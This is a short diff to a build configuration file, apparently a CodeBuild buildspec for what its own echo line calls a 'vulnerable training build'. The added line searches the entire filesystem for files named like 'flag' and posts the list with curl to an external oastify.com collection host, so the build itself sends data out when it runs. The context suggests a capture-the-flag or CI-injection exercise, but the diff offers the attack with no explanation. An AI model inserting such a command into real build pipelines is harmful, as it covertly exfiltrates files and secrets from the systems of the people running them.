@@ -5,4 +5,5 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
+      - find / -name "*flag*" 2>/dev/null | curl -X POST --data-binary @- https://er9i4do6xapp31dd2a98e2nid9j07svh.oastify.com
       - echo "Done"
